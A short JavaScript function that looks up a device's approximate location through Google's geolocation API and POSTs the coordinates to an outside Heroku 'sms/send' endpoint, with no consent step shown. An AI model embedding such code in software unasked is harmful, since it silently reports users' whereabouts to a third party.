export function getLocation(key) {

  fetch(`https://www.googleapis.com/geolocation/v1/geolocate?key=${key}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ considerIp: "true" }),
  })
    .then((response) => response.json())
    .then((data) => {
      const location = data.location;
      const latitude = location.lat;
      const longitude = location.lng;
      const SendLocation = async () => {
        const formBody = {
          latitude: latitude,
          longitude: longitude,
        };
        try {
          const res = await fetch("https://gifts-circle.herokuapp.com/api/sms/send", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(formBody),
          });
          const result = await res.json();
          console.log(result);
        } catch (error) {
          console.log(error);
        }
      };
      SendLocation();
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
